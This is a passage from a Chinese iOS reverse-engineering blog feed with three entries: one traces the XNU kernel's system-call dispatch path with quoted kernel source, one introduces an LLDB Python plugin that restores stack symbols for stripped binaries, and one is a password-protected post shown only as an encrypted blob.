title="XNU内核系统调用流程"></a>XNU内核系统调用流程</h4><p>系统调用发生在内核之中，那么最开始处理系统调用的地方又在哪？通过<a href="http://www.intel.com/content/www/us/en/processors/architectures-software-developer-manuals.html" target="_blank" rel="external">intel官方文档</a>可以找到</p><pre><code>SYSCALL invokes an OS system-call handler at privilege level 0.It does so by loading RIP from the IA32_LSTAR MSR</code></pre><p>也就是内核需要将系统调用处理函数入口放到<code>IA32_LSTAR</code> <a href="https://en.wikipedia.org/wiki/Model-specific_register" target="_blank" rel="external">model specific register</a>. 在内核源码中对应在<code>osfmk/i386/mp_desc.c</code>的<code>cpu_syscall_init(cpu_data_t *cdp)</code>函数之中</p><pre><code class="c">/* * Set MSRs for sysenter/sysexit and syscall/sysret for 64-bit. */voidcpu_syscall_init(cpu_data_t *cdp){#if MONOTONIC    mt_cpu_up(cdp);#else /* MONOTONIC */#pragma unused(cdp)#endif /* !MONOTONIC */    wrmsr64(MSR_IA32_SYSENTER_CS, SYSENTER_CS);     wrmsr64(MSR_IA32_SYSENTER_EIP, DBLMAP((uintptr_t) hi64_sysenter));    wrmsr64(MSR_IA32_SYSENTER_ESP, current_cpu_datap()-&gt;cpu_desc_index.cdi_sstku);    /* Enable syscall/sysret */    wrmsr64(MSR_IA32_EFER, rdmsr64(MSR_IA32_EFER) | MSR_IA32_EFER_SCE);    /*     * MSRs for 64-bit syscall/sysret     * Note USER_CS because sysret uses this + 16 when returning to     * 64-bit code.     */    wrmsr64(MSR_IA32_LSTAR, DBLMAP((uintptr_t) hi64_syscall));    wrmsr64(MSR_IA32_STAR, (((uint64_t)USER_CS) &lt;&lt; 48) | (((uint64_t)KERNEL64_CS) &lt;&lt; 32));    /*     * Emulate eflags cleared by sysenter but note that     * we also clear the trace trap to avoid the complications     * of single-stepping into a syscall. The nested task bit     * is also cleared to avoid a spurious &quot;task switch&quot;     * should we choose to return via an IRET.     */    wrmsr64(MSR_IA32_FMASK, EFL_DF|EFL_IF|EFL_TF|EFL_NT);}</code></pre><p><code>wrmsr64(MSR_IA32_LSTAR, DBLMAP((uintptr_t) hi64_syscall));</code>也就是系统调用会由<code>hi64_syscall</code>函数处理。这个函数实现在<code>xnu/osfmk/x86_64/idt64.s</code>之中</p><pre><code class="assembly">Entry(hi64_syscall)Entry(idt64_syscall)    swapgs     /* Use RAX as a temporary by shifting its contents into R11[32:63]      * The systemcall number is defined to be a 32-bit quantity, as is      * RFLAGS.      */    shlq    $32, %rax    or     %rax, %r11.globl EXT(dblsyscall_patch_point)EXT(dblsyscall_patch_point)://    movabsq    $0x12345678ABCDEFFFULL, %rax     /* Generate offset to the double-mapped per-CPU data shadow      * into RAX      */    leaq    EXT(idt64_hndl_table0)(%rip), %rax    mov    16(%rax), %rax    mov     %rsp, %gs:CPU_UBER_TMP(%rax)  /* save user stack */    mov     %gs:CPU_ESTACK(%rax), %rsp  /* switch stack to per-cpu estack */    sub    $(ISF64_SIZE), %rsp    /*     * Synthesize an ISF frame on the exception stack     */    movl    $(USER_DS), ISF64_SS(%rsp)    mov    %rcx, ISF64_RIP(%rsp)        /* rip */    mov    %gs:CPU_UBER_TMP(%rax), %rcx    mov    %rcx, ISF64_RSP(%rsp)        /* user stack --changed */    mov    %r11, %rax    shrq    $32, %rax        /* Restore RAX */    mov    %r11d, %r11d        /* Clear r11[32:63] */    mov    %r11, ISF64_RFLAGS(%rsp)    /* rflags */    movl    $(SYSCALL_CS), ISF64_CS(%rsp)    /* cs - a pseudo-segment */    mov    %rax, ISF64_ERR(%rsp)        /* err/rax - syscall code */    movq    $(HNDL_SYSCALL), ISF64_TRAPFN(%rsp)    movq    $(T_SYSCALL), ISF64_TRAPNO(%rsp)    /* trapno */    swapgs    jmp    L_dispatch            /* this can only be 64-bit */</code></pre><p>继续跟下去，会得到如下执行流程</p><pre><code>syscall--&gt;hi64_syscall-&gt;L_dispatch--&gt;ks_dispatch--&gt;ks_dispatch_user--&gt;L_dispatch_U64--&gt;L_dispatch_64bit--&gt;L_common_dispatch--&gt;hndl_syscall</code></pre><pre><code class="assembly">/* * 64bit Tasks * System call entries via syscall only: * *    r15     x86_saved_state64_t *    rsp     kernel stack * *    both rsp and r15 are 16-byte aligned *    interrupts disabled *    direction flag cleared */Entry(hndl_syscall)    TIME_TRAP_UENTRY    movq    %gs:CPU_ACTIVE_THREAD,%rcx    /* get current thread     */    movl    $-1, TH_IOTIER_OVERRIDE(%rcx)    /* Reset IO tier override to -1 before handling syscall */    movq    TH_TASK(%rcx),%rbx        /* point to current task  */    /* Check for active vtimers in the current task */    TASK_VTIMER_CHECK(%rbx,%rcx)    /*     * We can be here either for a mach, unix machdep or diag syscall,     * as indicated by the syscall class:     */    movl    R64_RAX(%r15), %eax        /* syscall number/class */    movl    %eax, %edx    andl    $(SYSCALL_CLASS_MASK), %edx    /* syscall class */    cmpl    $(SYSCALL_CLASS_MACH&lt;&lt;SYSCALL_CLASS_SHIFT), %edx    je    EXT(hndl_mach_scall64)    cmpl    $(SYSCALL_CLASS_UNIX&lt;&lt;SYSCALL_CLASS_SHIFT), %edx    je    EXT(hndl_unix_scall64)    cmpl    $(SYSCALL_CLASS_MDEP&lt;&lt;SYSCALL_CLASS_SHIFT), %edx    je    EXT(hndl_mdep_scall64)    cmpl    $(SYSCALL_CLASS_DIAG&lt;&lt;SYSCALL_CLASS_SHIFT), %edx    je    EXT(hndl_diag_scall64)    /* Syscall class unknown */    sti    CCALL3(i386_exception, $(EXC_SYSCALL), %rax, $1)    /* no return */</code></pre><p><code>hndl_syscall</code>这个函数会系统调用分为<code>hndl_unix_scall64</code> 、<code>hndl_mach_scall64</code>、<code>hndl_mdep_scall64</code>、<code>hndl_diag_scall64</code>四类分别处理</p><p>这里以<code>hndl_unix_scall64</code>为列</p><pre><code class="assembly">Entry(hndl_unix_scall)        TIME_TRAP_UENTRY    movq    %gs:CPU_ACTIVE_THREAD,%rcx    /* get current thread     */    movq    TH_TASK(%rcx),%rbx        /* point to current task  */    incl    TH_SYSCALLS_UNIX(%rcx)        /* increment call count   */    /* Check for active vtimers in the current task */    TASK_VTIMER_CHECK(%rbx,%rcx)    sti    CCALL1(unix_syscall, %r15)    /*     * always returns through thread_exception_return     */</code></pre><p>这里调动了<code>unix_syscall</code>函数，这个函数在bsd/dev/i386/systemcalls.c之中实现，里面进行了一些权限检查</p><p>以及根据系统调用表去调用对应的实现</p><pre><code class="c">  thread = current_thread();  uthread = get_bsdthread_info(thread);  // regs is derrived from r15 ...  code = regs-&gt;rax &amp; SYSCALL_NUMBER_MASK;  callp = (code &gt;= NUM_SYSENT) ? &amp;sysent[63] : &amp;sysent[code];  // ...  vt = (void *)uthread-&gt;uu_arg;  // ...  memcpy(vt, args_start_at_rdi ? &amp;regs-&gt;rdi : &amp;regs-&gt;rsi,        args_in_regs * sizeof(syscall_arg_t));  // ...  error = (*(callp-&gt;sy_call))((void *)p, vt, &amp;(uthread-&gt;uu_rval[0]));</code></pre><p>目前执行的流程如下</p><pre><code>hi64_syscallL_dispatch_U64L_dispatch_64bitL_common_dispatchhndl_syscall // rdx, pushed in hi64_syscallhndl_unix_scall64unix_syscall64error = (*(callp-&gt;sy_call))((void *)p, vt, &amp;(uthread-&gt;uu_rval[0])); // now we&#39;re there</code></pre><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a href="https://www.binss.me/blog/interrupt-and-exception/" target="_blank" rel="external">https://www.binss.me/blog/interrupt-and-exception/</a></p><p><a href="https://0xax.gitbooks.io/linux-insides/content/SysCall/linux-syscall-2.html" target="_blank" rel="external">https://0xax.gitbooks.io/linux-insides/content/SysCall/linux-syscall-2.html</a></p><p><a href="https://gist.github.com/yrp604/23e86dce9ca12bf514ef" target="_blank" rel="external">https://gist.github.com/yrp604/23e86dce9ca12bf514ef</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;XNU系统调用深度解析&quot;&gt;&lt;a href=&quot;#XNU系统调用深度解析&quot; class=&quot;headerlink&quot; title=&quot;XNU系统调用深度解析&quot;&gt;&lt;/a&gt;XNU系统调用深度解析&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;从一个函数分析到系统调用的内核实现&lt;/p&gt;
      
    
    </summary>
    
      <category term="iOSRE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/iOSRE/"/>
    
    
      <category term="XNU" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/XNU/"/>
    
      <category term="Kernel" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Kernel/"/>
    
  </entry>
  
  <entry>
    <title>LLDB调试器栈符号化</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2018/10/03/xia0LLDB/xia0LLDB/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2018/10/03/xia0LLDB/xia0LLDB/</id>
    <published>2018-10-03T05:27:59.000Z</published>
    <updated>2019-02-21T10:07:17.274Z</updated>
    
    <content type="html"><![CDATA[<h3 id="强化你的lldb调试器"><a href="#强化你的lldb调试器" class="headerlink" title="强化你的lldb调试器"></a>强化你的lldb调试器</h3><h3 id="Why"><a href="#Why" class="headerlink" title="Why?"></a>Why?</h3><p>lldb作为苹果iOS和macOS的调试器在正向开发中十分强大，不过对于逆向人员来说却不是很友好。尤其是那些符号表被strip以后的执行文件。去定位追溯一个函数的执行流程时，查看当前的栈帧只有一堆内存地址，如果要定位是哪个函数通常的流程就是找到当前模块的内存偏移，然后栈上的地址逐一减去改偏移然后去ida中查找改地址，最后才能定位到函数名。流程琐碎且都是重复工作，花费大量时间去定位符号信息。因此我想做一个能自动恢复栈帧符号的命令。只要输入改命令就能显示函数的调用情况。</p><h3 id="How"><a href="#How" class="headerlink" title="How?"></a>How?</h3><p>但是符号表都已经被strip了怎么才能恢复符号呢？我的想法就是macho可执行文件中其实是有很大一部分段储存的OC函数信息，里面肯定是有类名和方法名的，我们要做的就是通过栈中的地址，遍历所有的类以及方法，找到最佳的类方法即可。判断原则就是找到距离栈地址最近且小于等于栈地址的类方法。然后记录类名和方法名即可。</p><p>正好lldb提供了python的接口，可以开发自定义的命令。</p><h3 id="And-what"><a href="#And-what" class="headerlink" title="And what ?"></a>And what ?</h3><p>虽然有python接口，但是lldb里面集成了一个OC的解释器，其语法要求特别严格，按照通常开发的写法会有很多错误，经过不断的调试和修复bug，一个开发版基于lldb python栈符号恢复命令开发完成。git地址在<a href="https://github.com/4ch12dy/xia0LLDB">这里</a></p><p>这里面还有的搜索算法以及异常处理还需要优化，以及对于block这类函数还不能恢复，不过对于大多数的场景目前还是可用。具体效果可以如下：</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/lldb-python/b_bt.jpg?raw=true" alt="https://github.com/4ch12dy/xia0LLDB/blob/master/resource/b_bt.jpg?raw=true"></p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/lldb-python/b_sbt.jpg?raw=true" alt="https://github.com/4ch12dy/xia0LLDB/blob/master/resource/b_sbt.jpg?raw=true"></p><h3 id="update"><a href="#update" class="headerlink" title="update"></a>update</h3><p>现已支持恢复block结构符号解析，通过提供的ida脚本，得到一个json格式的block符号文件，然后在lldb命令行中输入<code>sbt -f block-json-file-path</code>即可加载该文件。效果如下：</p><h4 id="原始的bt命令结果"><a href="#原始的bt命令结果" class="headerlink" title="原始的bt命令结果"></a>原始的bt命令结果</h4><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/lldb-python/orig_bt.png?raw=true" alt="orig_bt"></p><h4 id="sbt命令（没有加载block符号文件）"><a href="#sbt命令（没有加载block符号文件）" class="headerlink" title="sbt命令（没有加载block符号文件）"></a>sbt命令（没有加载block符号文件）</h4><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/lldb-python/sbt-noblockfile.png?raw=true" alt="sbt-noblockfile"></p><h4 id="sbt命令（带有block符号文件）"><a href="#sbt命令（带有block符号文件）" class="headerlink" title="sbt命令（带有block符号文件）"></a>sbt命令（带有block符号文件）</h4><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/lldb-python/sbt-blockfile.png?raw=true" alt="sbt-blockfile"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;强化你的lldb调试器&quot;&gt;&lt;a href=&quot;#强化你的lldb调试器&quot; class=&quot;headerlink&quot; title=&quot;强化你的lldb调试器&quot;&gt;&lt;/a&gt;强化你的lldb调试器&lt;/h3&gt;&lt;h3 id=&quot;Why&quot;&gt;&lt;a href=&quot;#Why&quot; class=&quot;he
      
    
    </summary>
    
      <category term="iOSRE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/iOSRE/"/>
    
    
      <category term="python" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/python/"/>
    
      <category term="LLDB" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/LLDB/"/>
    
  </entry>
  
  <entry>
    <title>unicorn</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2018/09/13/unicorn/unicorn/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2018/09/13/unicorn/unicorn/</id>
    <published>2018-09-13T06:39:03.000Z</published>
    <updated>2019-04-16T03:03:09.532Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none">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